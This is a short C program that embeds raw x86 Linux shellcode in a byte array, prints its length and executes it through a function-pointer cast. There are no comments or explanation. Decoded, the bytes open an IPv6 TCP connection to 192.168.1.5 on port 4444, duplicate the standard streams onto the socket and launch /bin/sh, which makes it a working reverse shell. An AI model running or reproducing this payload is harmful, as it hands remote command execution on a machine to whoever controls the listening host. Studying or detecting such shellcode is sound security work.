#include<stdio.h>
 
unsigned char shellcode[] = \
"\x6a\x66\x58\x31\xdb\x6a\x06\x6a\x01\x6a\x0a\x43\x89\xe1\xcd\x80\x96\x31\xc0\x50\x68\xc0\xa8\x01\x05\x66\x6a\xff\x50\x50\x66\x50\x50\x66\x68\x11\x5c\x66\x6a\x0a\x89\xe1\x6a\x1c\x51\x56\x89\xe1\x43\x43\x6a\x66\x58\xcd\x80\x6a\x02\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x31\xc9\x51\x6a\x0b\x58\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80";

main()
{
	printf("Shellcode Length:  %d\n", sizeof(shellcode) - 1);
	int (*ret)() = (int(*)())shellcode;
	ret();
}
